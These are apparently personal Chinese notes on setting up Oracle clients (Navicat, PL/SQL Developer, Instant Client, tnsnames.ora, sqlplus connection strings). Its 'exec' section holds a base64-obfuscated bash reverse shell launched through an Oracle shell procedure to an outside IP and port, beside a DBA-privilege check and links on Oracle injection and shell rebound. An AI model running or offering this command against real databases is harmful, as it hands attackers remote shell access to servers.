# Oracle
[Navicat 11.2](https://download.navicat.com.cn/download/navicat112_premium_cs_x86.exe)
[Navicat 11.2](https://download.navicat.com.cn/download/navicat112_premium_en_x86.exe)

plsql
instant client 下载
1. 注意x64和x86。  navicat和plsql 对应的x86和x64要一致。
instant client 下载

plsql: help - support info 
查看 tnsfile

instant client解压到 D:\instantclient_11_2
## exec执行
```sh
sqlplus username/password@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(Host=<IP>)(Port=1521))(CONNECT_DATA=(SID=<sidname>)))

set serveroutput on;
exec dbms_java.set_output(131072);
exec shell('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMS4xMS4xMTEuMjMzLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}');
select userenv('isdba') from dual; # 查看是否dba
```
## 注入
- https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/
- https://blog.51cto.com/u_11529070/3607477

## 配置环境变量
1.
```bat
:: instantclient
TNS_ADMIN=D:\instantclient_11_2\network\admin
ORACLE_HOME=D:\instantclient_11_2
个别需要添加 lib 目录到 path
:: 数据库版 
setx TNS_ADMIN C:\oraclexe\app\oracle\product\11.2.0\server\network\admin /m 
setx ORACLE_HOME C:\oraclexe\app\oracle\product\11.2.0\server /m 
```

-- PLSQL 会自动在 TNS_ADMIN 中查找tnsnames.ora 文件。

2.
PATH添加 %D:\instantclient_11_2%
```
setx TNS_ADMIN "D:\instantclient_11_2" /m
```
D:\instantclient_11_2创建tnsnames.ora

3.直接命令连接
```
sqlplus "user/pass@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(Host=hostname.network)(Port=1521))(CONNECT_DATA=(SID=remote_SID)))"
sqlplus user/pass@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(Host=hostname.network)(Port=1521))(CONNECT_DATA=(SID=remote_SID)))
sqlplus test/test@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(Host=10.3.1.1)(Port=1521))(CONNECT_DATA=(SID=Normal)))
```


```sql
-- 查看SID
select instance_name from V$instance;
-- 查看 Service name
SELECT value FROM v$parameter WHERE name='service_names';
```

配置示例1
```js
NORMAL_127.0.0.1 =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 127.0.0.1)(PORT = 1521))
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.63.81.127)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SID = Normal)
      (SERVER = DEDICATED)
    )
  )
```
示例2
```js
sit_cc =
  (DESCRIPTION =
    (ADDRESS_LIST =
    (ADDRESS = (PROTOCOL = TCP)(HOST = 192.168.154.1)(PORT = 1521))
  )
  (CONNECT_DATA =
    (SERVER = DEDICATED)
    (SERVICE_NAME = cc)
  )
)
```

### 重启 Oracle
比如修改了normal数据库, 重启服务,
```
OracleOraHome92TNSListener
OracleServiceNormal
```
### PL/SQL 登录
Database: 192.168.200.70:15121/scm


## navicat 配置
1.设置好对应版本的 oci.dll，重启 oci.dll
以上基础上。直接将D:\instantclient_11_2整个文件夹复制到navicat进行覆盖。

网络服务名 根据配置 可能为 TNS

Navicat 11 - Oracle 9i
